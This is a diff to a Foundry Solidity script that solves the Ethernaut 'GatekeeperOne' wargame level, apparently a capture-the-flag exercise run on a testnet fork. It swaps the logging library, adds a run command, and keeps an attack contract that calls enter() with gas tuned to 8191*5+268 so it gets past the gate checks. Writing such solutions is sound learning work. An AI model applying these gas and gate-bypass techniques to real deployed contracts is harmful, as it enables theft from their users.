@@ -1,13 +1,12 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "forge-std/Script.sol";
-import "forge-std/console.sol";
+import {Script, console2} from "forge-std/Script.sol";
 import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 
 contract GatekeeperOneSolution is Script {
     // $ forge script script/GatekeeperOne.s.sol --tc GatekeeperOneSolution
-
+    // forge script script/GatekeeperOne.s.sol:GatekeeperOneSolution --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
     GatekeeperOne gateKeeperInstance;
     GateKeeperAttack attackContract;
 
@@ -29,9 +28,9 @@ contract GatekeeperOneSolution is Script {
         // This formate will pass the three checks in the third gate modifier, which existed in the GatekeeperOne contract.
         // For more info, you can check out the solution in the GitHub repo
 
-        console.log("entrant:", gateKeeperInstance.entrant());
+        console2.log("entrant:", gateKeeperInstance.entrant());
         attackContract.attack();
-        console.log("entrant:", gateKeeperInstance.entrant());
+        console2.log("entrant:", gateKeeperInstance.entrant());
 
         // -----------------
     }
@@ -61,5 +60,6 @@ contract GateKeeperAttack {
         // You can import `forge-std/console.sol` in the contract and calculate it by this way.
         // So we need to pass gas divisible by 8191 and adding 268 to it, to path the `gateTwo` modifier check.
         gateKeeperInstance.enter{gas: 8191 * 5 + 268}(gateKey);
+        // gateKeeperInstance.enter{gas: 8191 * 5 + 473}(gateKey);
     }
 }
